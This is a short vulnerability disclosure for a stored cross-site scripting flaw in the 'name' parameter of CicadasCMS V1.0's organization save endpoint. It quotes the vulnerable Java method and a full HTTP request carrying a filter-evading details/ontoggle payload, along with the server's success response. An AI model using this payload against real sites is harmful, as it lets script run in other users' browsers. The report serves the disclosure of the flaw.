CicadasCMS - Cross Site Scripting on (cms/service/impl/OrganizationServiceImpl.java name parameter) 

Vendor Homepage:
```
https://gitee.com/westboy/CicadasCMS/branches
```

Version: 

```
V1.0
```

Tested on: 

```
JAVA, Apache, MySQL
```

Affected Page:

```
cms/service/impl/OrganizationServiceImpl.java
```

On this page, name parameter of the pojo is vulnerable to Cross Site Scripting

```
    public String save(TSysOrg pojo) {
         if(orgMapper.insertSelective(pojo)>0)
            return JsonUtil.toSUCCESS("添加成功！","org-tab",false);
        return JsonUtil.toERROR("添加成功！");
    }
```

Request:

```
POST /system/org/save HTTP/1.1
Host: 172.16.99.36
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 98
Origin: http://172.16.99.36
Connection: keep-alive
Referer: http://172.16.99.36/system
Cookie: SESSION=3d6a72f7-d5f1-44a9-96db-ad82e7655d77; bjui_theme=blue
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache

id=&name=%3Cdetails+open+ontoggle%3Dtop%5B'ale'%2B'rt'%5D(1)%3E&code=1111&pid=0&telPhone=&address=
```

Response:

```
HTTP/1.1 200 
Content-Type: application/json;charset=UTF-8
Content-Length: 120
Date: Sun, 21 Sep 2025 12:37:13 GMT

{"tabid":"org-tab","forward":"","message":"添加成功！","closeCurrent":false,"forwardConfirm":"","statusCode":"200"}
```
